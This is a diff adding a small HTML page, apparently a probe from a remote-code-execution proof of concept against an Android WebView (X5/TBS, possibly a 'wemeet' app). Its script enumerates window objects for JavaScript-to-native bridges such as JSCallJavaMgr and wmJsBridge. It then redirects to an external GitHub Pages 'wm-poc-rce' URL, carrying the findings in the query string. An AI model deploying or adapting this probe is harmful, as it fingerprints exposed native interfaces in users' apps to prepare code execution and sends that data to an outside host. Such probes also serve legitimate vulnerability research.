@@ -1,0 +1,14 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P21X5</title></head>
+<body><h1>P21X5</h1>
+<script>
+function dump(){
+  var k=[];
+  try{for(var i in window){if(/js|native|bridge|android|tbs|x5|java|wemeet|prompt|file|download/i.test(i))k.push(i);}}catch(e){}
+  var extra=[];
+  try{extra.push('JSCall='+typeof window.JSCallJavaMgr);extra.push('wm='+typeof window.wmJsBridge);extra.push('tbs='+typeof window.tbs);extra.push('X5='+typeof window.X5);}catch(e){}
+  location.replace('https://gitwhs.github.io/wm-poc-rce/probe20cb.html?if='+encodeURIComponent((k.join(',')||'none')+'|'+extra.join(',')));
+}
+setTimeout(dump, 800);
+</script>
+</body></html>
